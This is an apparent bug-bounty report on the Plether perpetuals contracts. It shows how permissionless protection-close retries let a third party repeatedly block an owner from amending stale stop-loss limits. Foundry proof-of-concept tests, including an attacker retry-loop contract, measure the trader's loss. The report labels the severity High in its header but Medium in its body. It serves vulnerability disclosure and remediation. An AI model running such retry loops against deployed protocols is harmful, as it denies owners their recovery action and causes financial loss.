# \#97946 [SC-High] Permissionless retries can repeatedly preempt owner amendments to failed protection close limits

**Submitted on Nov 4th 2026 at 02:35:43 UTC by @CarlosMB for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97946
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Executive Summary

A failed stop-loss close leaves Alice's protection `Latched`, the only post-trigger state in which she can raise its financial limits. `retryPositionProtectionClose` is permissionless: Mallory can execute a child that fails under the stored cap and retry in the same transaction, then combine each later expiry and retry atomically. Every retry queues a child with Alice's obsolete cap and moves the protection to `Triggered`. Her amendment reverts while the active protection also blocks an ordinary close. Mallory can repeat the denial whenever she wins ordering at a relatch.

Three passing Foundry PoCs demonstrate the state denial, compare owner-first and attacker-first outcomes from the same snapshot, and test owner-side batch recovery. In the control, Alice amends and closes her LONG at 1.10. After Mallory's initial retry and two expiry/retry cycles, Alice closes 184 simulated seconds later at 1.12 and has 200.080018 USDG less in her Clearinghouse balance under the same adverse price path. The impact is Medium Griefing: a third party denies the owner's limit-repair action and prolongs market exposure.

## Background

A triggered stop-loss or take-profit protection is `Triggered` while its child close order is live. Terminal failure or expiry with the same protected position returns it to `Latched`; the trigger remains binding in both states. The owner cannot cancel it or submit a discretionary close while the protection lock remains. The [canonical entrypoints](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/CANONICAL_ENTRYPOINTS.md#L142-L148) and [action interface](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/interfaces/IPositionProtectionActions.sol#L32-L37) permit the owner to amend close limits while `Latched` and with no pending Router order.

In the reproduction Alice holds a 10,000-lot LONG with 2,000 USDG position margin. Her stop-loss triggers at a basket mark of 1.10. The stored maximum execution notional is one USDG atom below the 11,000 USDG notional at that mark, so the first child fails with `ConstraintViolation/ExecutionNotional` and leaves the position open. Alice raises that limit to 25,000 USDG in the owner-first control.

The frozen competition code matches the [v2.0.0 release](https://github.com/Plether-Fi/plether-core/releases/tag/v2.0.0) in `packages/perps/src` ([source comparison](https://github.com/immunefi-team/audit-comp-plether/compare/1209ca8a5b94a4fb6323c7c4585846ed93db3932...a82d4fefb02768e5b3bddcc97dee371eee24fea8)). The [Router default](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderExecutionOrchestrator.sol#L10-L14) is 60 seconds; a read-only `eth_call` to the [deployed v2.0.0 Router](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/deployments/releases/2026-10-28-perps-arbitrum-sepolia-v2.0.0/manifest.json#L118-L121) at Arbitrum Sepolia block 325818971 returned `0x3c` (60) for `maxExecutionWindowSeconds()`. Each protected child [copies the current Router value](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L657-L680); [`expireOrder` requires a timestamp past that child's deadline](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRecoverySidecar.sol#L49-L63).

## Vulnerability Details

Mallory can submit public retries, while only Alice may change the stored financial limits. [`amendLatchedPositionProtectionCloseLimits`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L315-L328) authenticates the owner but also requires `Latched` status and no pending account order:

~~~solidity
StoredProtection storage protection = _ownedActiveProtection(protectionId, msg.sender);
if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
    revert OrderRouter__ProtectionNotLatched();
}
if (IPositionProtectionRouterHost(ROUTER).pendingOrderCounts(msg.sender) != 0) {
    revert OrderRouter__PendingOrdersExist();
}
~~~

[`retryPositionProtectionClose`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L382-L405) has no owner check. It commits a new close and [sets the protection to `Triggered`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L564-L574). The new request [copies the stored close limits](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L657-L680). A third party can therefore occupy the amendment state with another child carrying the same cap that made the first close fail.

The first PoC has Mallory's contract call `Router.executeOrder` and `retryPositionProtectionClose` in one transaction. The child fails with `ConstraintViolation/ExecutionNotional`; the retry immediately moves the protection back to `Triggered`, and Alice's amendment reverts with `ProtectionNotLatched`. At a later deadline, Mallory's contract calls the public [`expireOrder`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouter.sol#L191-L196), then retry before returning. Expiry [relatches the unchanged position](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L637-L668), but Alice cannot interleave a transaction between Mallory's two calls. The fresh child uses the same stale cap, so the amendment remains unavailable. The cycle can be repeated while Mallory wins ordering and the old cap prevents execution.

Alice cannot cancel after the trigger: [`cancelPositionProtection` accepts only `PendingOpen` or `Armed`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L408-L429), and the atomic cancel-and-close action also requires `Armed`. The [ordinary Router commit path](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L313-L315) rejects a close while the protection lock is active. The owner thus cannot bypass the stale limit with a discretionary close.

[PR #78](https://github.com/Plether-Fi/plether-core/pull/78) disclosed permissionless retries of deterministic failures, poor retry timing and repeated expiry cycles. It predates the owner-only amendment, which [PR #124](https://github.com/Plether-Fi/plether-core/pull/124) added with trader-selected financial limits as its MED-9 fix. This report concerns denial of that later recovery action and the resulting delayed-exit loss, rather than FIFO or gas pressure alone. The [competition's public-known-issue rule](https://immunefi.com/audit-competition/plether/scope/) turns on whether the cause was previously disclosed. PR #124 makes amendment conditional on `Latched` and does not grant owner priority; accepted-design classification remains the principal eligibility risk.

## Exploitability Analysis

The same-state counterfactual isolates Mallory's intervention. Both branches start after the first `ConstraintViolation` with identical protection status, position, balances, limits and pool depth. The external mark remains 1.10 and rises to 1.12 at the same later horizon in both branches. In Plether a LONG gains when the basket mark falls, so the rise is adverse to Alice ([protocol README](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/README.md#L14-L18)). Alice amends and closes before the rise in the control. In the attack branch Mallory submits an initial retry and two atomic expiry/retry cycles, and Alice closes only after Mallory stops. No external liquidity is added or removed between branches.

| Final state | Owner-first control | Mallory-first sequence |
| --- | ---: | ---: |
| Alice's Clearinghouse balance | 18,991.400000 USDG | 18,791.319982 USDG |
| Treasury balance | 8.400000 USDG | 8.480000 USDG |
| HousePool totalAssets | 1,003,000.000000 USDG | 1,003,200.000018 USDG |
| Mallory's wallet/margin USDG | 0/0 | 0/0 |

Alice finishes with 200.080018 USDG less in the attack branch. The 0.02 adverse move across 10,000 lots accounts for 200 USDG; the higher close notional adds 0.08 USDG to treasury fees, and 0.000018 USDG is the remaining pool difference. Mallory's wallet and Clearinghouse balances remain zero. The two measured atomic expiry/retry calls consume 1,872,956 EVM gas in this fixture, excluding the initial retry.

The owner-batch PoC demonstrates recovery if an owner-controlled account calls `expireOrder` and the amendment atomically before Mallory's next retry. A separate keeper may also execute a stale-limit child before its deadline; if that execution fails, the protection relatches early and Alice can win the next amendment race. Mallory must win ordering at each relatch, but does not need to act in every block. An owner sending separate EOA transactions cannot make expiry and amendment atomic.

The [competition lists Medium Griefing independently of its one-hour temporary-freeze impact](https://immunefi.com/audit-competition/plether/scope/). The [public AI scan finding on trigger and close bounties](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/scan-plether-fi-plether-core-d4541b49.md#L542-L584) addresses keeper funding, not denial of the later owner amendment.

## Proof of Concept

## Proof of Concept

These three Solidity files ran in the repository's Foundry suite at the frozen commit with Solidity 0.8.35; no in-scope contract was modified. The existing fixture seeds the initial LONG through [`BasePerpTest._open`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/test/perps/BasePerpTest.sol#L441-L477), which calls the Engine as the Router. The attacked protection creation, trigger, child execution, expiry, retry, amendment and final close use the actual Book and inherited Router methods. The fixture's [`LegacyOrderRouterHarness`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/test/utils/LegacyOrderRouterHarness.sol#L1-L31) adds a scalar commit overload used only to assert the ordinary-close lock.

The fixture uses two oracle feeds, VPI factor zero, maintenance margin 100 bps and initial margin 150 bps. The [checked-in release defaults](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/DEPLOYMENT.md#L123-L150) use VPI factor 0.01e18, maintenance margin 10 bps and initial margin 20 bps with a [six-feed basket](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/DEPLOYMENT.md#L3-L4). The state-denial path runs through the in-scope contracts; the reported 200.080018 USDG balance difference and gas values are measured in the fixture. Mock Pyth data and USDG replace external components.

Prepare a disposable checkout with the pinned submodules and Solidity 0.8.35:

~~~sh
git clone --recurse-submodules https://github.com/immunefi-team/audit-comp-plether.git
cd audit-comp-plether
git checkout --detach a82d4fefb02768e5b3bddcc97dee371eee24fea8
git submodule update --init --recursive
make build-perps
mkdir -p packages/perps/test/validation
~~~

Save the three complete sources below in `packages/perps/test/validation/` with the stated filenames. The counterfactual and owner-batch files import the first file. Run:

~~~sh
forge test --root packages/perps --match-path test/validation/PositionProtectionRetryStarvation.t.sol --match-test test_ThirdPartyCanKeepOwnerFromAmendingAcrossTwoExpiries --offline --use 0.8.35 -vv
forge test --root packages/perps --match-path test/validation/PositionProtectionCounterfactual.t.sol --match-test test_SameStateAttackerCyclesDelayRecoveryUntilWorsePrice --offline --use 0.8.35 -vv
forge test --root packages/perps --match-path test/validation/PositionProtectionOwnerBatchRecovery.t.sol --match-test test_OwnerBatchCanExpireAndAmendBeforeThirdPartyRetry --offline --use 0.8.35 -vv
~~~

**PositionProtectionRetryStarvation.t.sol** — triggers the failed close, places a retry in the same attacker contract call, runs two atomic expiry/retry cycles, confirms owner amendment and ordinary close rejection, and confirms amendment succeeds once Mallory stops. Its short-form commitOrder call is an inherited fixture convenience overload used only to check the protection lock; the attack and economic control use the production Book and Router entrypoints.

~~~solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {PositionProtectionTest} from "../perps/spec/trader/PositionProtection.t.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {IOrderLifecycleBook} from "@plether/perps/interfaces/IOrderLifecycleBook.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";

interface IExpiringRouter {
    function expireOrder(uint64 orderId) external;
    function executeOrder(uint64 orderId, bytes[] calldata pythUpdateData) external payable returns (OrderV3Types.ExecutionResult memory);
}

contract ThirdPartyRetryLoop {
    receive() external payable {}

    function executeAndRetry(address router, address protectionBook, uint64 orderId, uint64 protectionId, bytes[] calldata data)
        external payable returns (OrderV3Types.ExecutionResult memory result, uint64 retryOrderId)
    {
        result = IExpiringRouter(router).executeOrder{value: msg.value}(orderId, data);
        retryOrderId = IPositionProtectionActions(protectionBook).retryPositionProtectionClose(protectionId);
    }

    function expireAndRetry(address router, address protectionBook, uint64 orderId, uint64 protectionId)
        external
        returns (uint64)
    {
        IExpiringRouter(router).expireOrder(orderId);
        return IPositionProtectionActions(protectionBook).retryPositionProtectionClose(protectionId);
    }
}

contract PositionProtectionRetryStarvationValidation is PositionProtectionTest {
    function test_ThirdPartyCanKeepOwnerFromAmendingAcrossTwoExpiries() public {
        _startRecordingLogs();
        _open(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, MARK_PRICE);
        PositionProtectionTypes.PositionProtectionParams memory params = _params(0, LONG_STOP_LOSS);
        uint256 expectedNotionalAssets = (POSITION_SIZE * LONG_STOP_LOSS) / 1e20;
        params.closeLimits.maxExecutionNotionalAssets = expectedNotionalAssets - 1;

        vm.prank(ALICE);
        uint64 protectionId = protectionActions.createPositionProtection(params);
        uint64 firstOrderId = _triggerAt(protectionId, LONG_STOP_LOSS);
        bytes[] memory executionData = _mockPythUpdateData(LONG_STOP_LOSS);
        ThirdPartyRetryLoop attacker = new ThirdPartyRetryLoop();
        (OrderV3Types.ExecutionResult memory result, uint64 child) =
            attacker.executeAndRetry(address(router), address(protectionActions), firstOrderId, protectionId, executionData);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Failed));
        assertEq(uint8(result.terminalReason), uint8(OrderV3Types.TerminalReason.ConstraintViolation));
        OrderV3Types.CompactOutcome memory outcome =
            _verifiedOutcome(IOrderLifecycleBook(address(router.lifecycleBook())), firstOrderId);
        assertEq(uint8(outcome.failedConstraint), uint8(OrderV3Types.ConstraintKind.ExecutionNotional));

        PositionProtectionTypes.CloseFinancialLimits memory amendedLimits =
            PositionProtectionTypes.CloseFinancialLimits({
                maxExecutionNotionalAssets: 25_000e6,
                maxGrossAccountDebitAssets: 25_000e6,
                maxActionChargeAssets: 25_000e6,
                maxExplicitFeesAssets: 25_000e6
            });

        for (uint256 i; i < 2; ++i) {
            assertEq(uint8(protectionViews.getPositionProtection(protectionId).status),
                uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered));
            assertEq(router.pendingOrderCounts(ALICE), 1);
            (uint256 remainingSize,,,,,,) = engine.positions(ALICE);
            assertEq(remainingSize, POSITION_SIZE, "protected position stays open");
            vm.prank(ALICE);
            vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
            router.commitOrder(CfdTypes.Side.LONG, POSITION_SIZE, 0, 0, true);
            vm.prank(ALICE);
            vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
            protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, amendedLimits);

            vm.warp(uint256(router.lifecycleBook().orderTiming(child).executionDeadline) + 1);
            child = attacker.expireAndRetry(address(router), address(protectionActions), child, protectionId);
        }

        // Countercontrol: if the attacker stops, expiry exposes Latched and the owner can amend.
        vm.warp(uint256(router.lifecycleBook().orderTiming(child).executionDeadline) + 1);
        router.expireOrder(child);
        assertEq(uint8(protectionViews.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Latched));
        vm.prank(ALICE);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, amendedLimits);
        assertEq(protectionViews.closeFinancialLimits(protectionId).maxExecutionNotionalAssets,
            amendedLimits.maxExecutionNotionalAssets);
    }
}

~~~

**PositionProtectionCounterfactual.t.sol** — branches from the same Latched snapshot and measures Alice's, the pool's, the treasury's and Mallory's balances at the common horizon.

~~~solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {PositionProtectionRetryStarvationValidation, ThirdPartyRetryLoop} from "./PositionProtectionRetryStarvation.t.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {console2} from "forge-std/console2.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

contract ProtectionCounterfactualValidation is PositionProtectionRetryStarvationValidation {
    uint256 internal constant LATER_ADVERSE_PRICE = 112_000_000;

    function test_SameStateAttackerCyclesDelayRecoveryUntilWorsePrice() public {
        _open(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, MARK_PRICE);
        PositionProtectionTypes.PositionProtectionParams memory params = _params(0, LONG_STOP_LOSS);
        uint256 firstNotional = (POSITION_SIZE * LONG_STOP_LOSS) / 1e20;
        params.closeLimits.maxExecutionNotionalAssets = firstNotional - 1;

        vm.prank(ALICE);
        uint64 protectionId = protectionActions.createPositionProtection(params);
        uint64 firstOrderId = _triggerAt(protectionId, LONG_STOP_LOSS);
        bytes[] memory initialData = _mockPythUpdateData(LONG_STOP_LOSS);
        OrderV3Types.ExecutionResult memory firstResult = router.executeOrder(firstOrderId, initialData);
        assertEq(uint8(firstResult.status), uint8(OrderV3Types.LifecycleStatus.Failed));
        assertEq(uint8(firstResult.terminalReason), uint8(OrderV3Types.TerminalReason.ConstraintViolation));
        assertEq(uint8(protectionViews.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Latched));

        PositionProtectionTypes.CloseFinancialLimits memory amendedLimits =
            PositionProtectionTypes.CloseFinancialLimits({
                maxExecutionNotionalAssets: 25_000e6,
                maxGrossAccountDebitAssets: 25_000e6,
                maxActionChargeAssets: 25_000e6,
                maxExplicitFeesAssets: 25_000e6
            });
        ThirdPartyRetryLoop attacker = new ThirdPartyRetryLoop();
        uint256 startTime = vm.getBlockTimestamp();
        uint256 snapshotId = vm.snapshotState();

        // Attack branch: the third party immediately occupies Latched and reoccupies it at each expiry.
        vm.prank(address(attacker));
        uint64 child = protectionActions.retryPositionProtectionClose(protectionId);
        uint256 totalAtomicGas;
        for (uint256 i; i < 2; ++i) {
            vm.prank(ALICE);
            vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
            protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, amendedLimits);

            vm.warp(uint256(router.lifecycleBook().orderTiming(child).executionDeadline) + 1);
            uint256 beforeGas = gasleft();
            child = attacker.expireAndRetry(address(router), address(protectionActions), child, protectionId);
            totalAtomicGas += beforeGas - gasleft();
            (uint256 stillOpen,,,,,,) = engine.positions(ALICE);
            assertEq(stillOpen, POSITION_SIZE);
        }
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, amendedLimits);

        // At the next expiry the attacker stops; the owner then takes the documented recovery route.
        vm.warp(uint256(router.lifecycleBook().orderTiming(child).executionDeadline) + 1);
        router.expireOrder(child);
        vm.prank(ALICE);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, amendedLimits);
        uint64 lateChild = protectionActions.retryPositionProtectionClose(protectionId);
        bytes[] memory laterData = _mockPythUpdateData(LATER_ADVERSE_PRICE);
        OrderV3Types.ExecutionResult memory lateResult = router.executeOrder(lateChild, laterData);
        assertEq(uint8(lateResult.status), uint8(OrderV3Types.LifecycleStatus.Executed));
        (uint256 lateSize,,,,,,) = engine.positions(ALICE);
        assertEq(lateSize, 0);
        uint256 attackBalance = clearinghouse.balanceAssets(ALICE);
        uint256 endTime = vm.getBlockTimestamp();
        uint256 attackTreasury = clearinghouse.balanceAssets(PROTOCOL_TREASURY_ACCOUNT);
        uint256 attackPool = pool.totalAssets();
        uint256 attackerWallet = settlementToken.balanceOf(address(attacker));
        uint256 attackerMargin = clearinghouse.balanceAssets(address(attacker));
        assertEq(attackerWallet, 0);
        assertEq(attackerMargin, 0);

        // Control branch: identical starting state and exogenous price path, owner amends first.
        assertTrue(vm.revertToState(snapshotId));
        vm.prank(ALICE);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, amendedLimits);
        uint64 earlyChild = protectionActions.retryPositionProtectionClose(protectionId);
        bytes[] memory earlyData = _mockPythUpdateData(LONG_STOP_LOSS);
        OrderV3Types.ExecutionResult memory earlyResult = router.executeOrder(earlyChild, earlyData);
        assertEq(uint8(earlyResult.status), uint8(OrderV3Types.LifecycleStatus.Executed));
        (uint256 earlySize,,,,,,) = engine.positions(ALICE);
        assertEq(earlySize, 0);
        uint256 controlBalanceAtClose = clearinghouse.balanceAssets(ALICE);

        vm.warp(endTime);
        bytes32[] memory feedIds = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](feedIds.length);
        uint256 publishTime = vm.getBlockTimestamp();
        for (uint256 j; j < feedIds.length; ++j) {
            ticks[j] = MockPyth.FeedUpdate(feedIds[j], MockPyth.MockPrice(
                int64(uint64(LATER_ADVERSE_PRICE)), 0, -8, publishTime, engine.lastMarkTime()
            ));
        }
        bytes[] memory markData = new bytes[](1);
        markData[0] = abi.encode(ticks);
        router.updateMarkPrice(markData);
        uint256 controlBalance = clearinghouse.balanceAssets(ALICE);
        assertEq(controlBalanceAtClose, controlBalance);
        assertGt(controlBalance, attackBalance, "delayed close should reduce trader balance");
        console2.log("control balance assets", controlBalance);
        console2.log("attack balance assets", attackBalance);
        console2.log("difference assets", controlBalance - attackBalance);
        console2.log("elapsed seconds", endTime - startTime);
        console2.log("two atomic expiry+retry gas", totalAtomicGas);
        console2.log("control treasury assets", clearinghouse.balanceAssets(PROTOCOL_TREASURY_ACCOUNT));
        console2.log("attack treasury assets", attackTreasury);
        console2.log("control pool assets", pool.totalAssets());
        console2.log("attack pool assets", attackPool);
        console2.log("attacker wallet assets", attackerWallet);
        console2.log("attacker margin assets", attackerMargin);
    }
}

~~~

**PositionProtectionOwnerBatchRecovery.t.sol** — demonstrates owner-side atomic recovery when its batch call runs before Mallory's retry in the test. OwnerBatchAccount is a small test contract with the relevant call semantics, not a deployed Plether SimpleAccount.

~~~solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {PositionProtectionRetryStarvationValidation, ThirdPartyRetryLoop} from "./PositionProtectionRetryStarvation.t.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";

contract OwnerBatchAccount {
    struct Call {
        address target;
        uint256 value;
        bytes data;
    }

    address public immutable owner;

    constructor(address owner_) {
        owner = owner_;
    }

    function execute(address target, uint256 value, bytes calldata data) external returns (bytes memory result) {
        require(msg.sender == owner, "owner");
        (bool ok, bytes memory ret) = target.call{value: value}(data);
        if (!ok) assembly { revert(add(ret, 32), mload(ret)) }
        return ret;
    }

    function executeBatch(Call[] calldata calls) external {
        require(msg.sender == owner, "owner");
        for (uint256 i; i < calls.length; ++i) {
            (bool ok, bytes memory ret) = calls[i].target.call{value: calls[i].value}(calls[i].data);
            if (!ok) assembly { revert(add(ret, 32), mload(ret)) }
        }
    }
}

contract ProtectionOwnerBatchRecoveryValidation is PositionProtectionRetryStarvationValidation {
    function test_OwnerBatchCanExpireAndAmendBeforeThirdPartyRetry() public {
        OwnerBatchAccount trader = new OwnerBatchAccount(address(this));
        _fundTrader(address(trader), 20_000e6);
        _open(address(trader), CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, MARK_PRICE);
        PositionProtectionTypes.PositionProtectionParams memory params = _params(0, LONG_STOP_LOSS);
        params.closeLimits.maxExecutionNotionalAssets = ((POSITION_SIZE * LONG_STOP_LOSS) / 1e20) - 1;
        bytes memory created = trader.execute(
            address(protectionActions), 0,
            abi.encodeCall(IPositionProtectionActions.createPositionProtection, (params))
        );
        uint64 protectionId = abi.decode(created, (uint64));
        uint64 firstChild = _triggerAt(protectionId, LONG_STOP_LOSS);
        bytes[] memory initialData = _mockPythUpdateData(LONG_STOP_LOSS);
        OrderV3Types.ExecutionResult memory first = router.executeOrder(firstChild, initialData);
        assertEq(uint8(first.status), uint8(OrderV3Types.LifecycleStatus.Failed));

        ThirdPartyRetryLoop attacker = new ThirdPartyRetryLoop();
        vm.prank(address(attacker));
        uint64 child = protectionActions.retryPositionProtectionClose(protectionId);
        vm.warp(uint256(router.lifecycleBook().orderTiming(child).executionDeadline) + 1);

        PositionProtectionTypes.CloseFinancialLimits memory amendedLimits =
            PositionProtectionTypes.CloseFinancialLimits({
                maxExecutionNotionalAssets: 25_000e6,
                maxGrossAccountDebitAssets: 25_000e6,
                maxActionChargeAssets: 25_000e6,
                maxExplicitFeesAssets: 25_000e6
            });
        OwnerBatchAccount.Call[] memory calls = new OwnerBatchAccount.Call[](2);
        calls[0] = OwnerBatchAccount.Call({
            target: address(router), value: 0,
            data: abi.encodeWithSelector(router.expireOrder.selector, child)
        });
        calls[1] = OwnerBatchAccount.Call({
            target: address(protectionActions), value: 0,
            data: abi.encodeCall(IPositionProtectionActions.amendLatchedPositionProtectionCloseLimits,
                (protectionId, amendedLimits))
        });
        trader.executeBatch(calls);
        assertEq(protectionViews.closeFinancialLimits(protectionId).maxExecutionNotionalAssets, 25_000e6);
        assertEq(uint8(protectionViews.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Latched));

        // The public retry remains available, but it must now copy the owner's corrected bounds.
        vm.prank(address(attacker));
        uint64 correctedChild = protectionActions.retryPositionProtectionClose(protectionId);
        assertEq(router.lifecycleBook().pendingPolicy(correctedChild).maxExecutionNotionalAssets, 25_000e6);
        bytes[] memory correctedData = _mockPythUpdateData(LONG_STOP_LOSS);
        OrderV3Types.ExecutionResult memory corrected = router.executeOrder(correctedChild, correctedData);
        assertEq(uint8(corrected.status), uint8(OrderV3Types.LifecycleStatus.Executed));
        (uint256 remainingSize,,,,,,) = engine.positions(address(trader));
        assertEq(remainingSize, 0);
    }
}

~~~

Selected lines from the observed Foundry runs:

~~~text
[PASS] test_ThirdPartyCanKeepOwnerFromAmendingAcrossTwoExpiries() (gas: 6095901)
[PASS] test_SameStateAttackerCyclesDelayRecoveryUntilWorsePrice() (gas: 7841026)
  control balance assets 18991400000
  attack balance assets 18791319982
  difference assets 200080018
  elapsed seconds 184
  two atomic expiry+retry gas 1872956
  control treasury assets 8400000
  attack treasury assets 8480000
  control pool assets 1003000000000
  attack pool assets 1003200000018
  attacker wallet assets 0
  attacker margin assets 0
[PASS] test_OwnerBatchCanExpireAndAmendBeforeThirdPartyRetry() (gas: 5267649)
~~~

Settlement and console values are six-decimal USDG atoms. `vm.warp` advances to successive deadlines; each atomic `expireOrder`/`retry` cycle corresponds to one attacker transaction if included on-chain. The 1.10-to-1.12 move is an exogenous price path applied at the same horizon in both branches. Transaction ordering is modeled in Foundry, and Mallory must win the race at each relatch.

## Remediation

Allow the owner to stage amended financial limits while a child is Triggered, and apply those limits only when a *future* protection child is committed. The live child must retain the exact limits with which it was queued. That gives an owner using a normal single-call account a way to repair a deterministic failure even if third parties immediately retry, while preserving permissionless execution and retry. An alternative is a bounded owner-priority period after a deterministic ConstraintViolation before public retry resumes; that choice trades prompt permissionless recovery for a guaranteed amendment opportunity.

A regression test should start from a genuine failed protection close, let a third party atomically expire and retry after each expiry, and show that an owner limit change is eventually stored and copied into the next child. Keep a control that public retry still works when the owner does nothing, and a check that amending future limits does not mutate an already-pending child's bounds.

## Summary

Permissionless retries can repeatedly move a failed protection out of the only post-trigger state in which Alice may amend stale close limits. The three passing PoCs show denial across two atomic expiry/retry cycles, quantify the owner-first versus attacker-first outcome, and demonstrate owner-batch recovery when it lands first. In the repository fixture, the specified adverse price move leaves Alice with 200.080018 USDG less after 184 simulated seconds of extra exposure. This is a Medium Griefing report about denial of an owner action added after [PR #78](https://github.com/Plether-Fi/plether-core/pull/78) disclosed permissionless retry and FIFO churn.

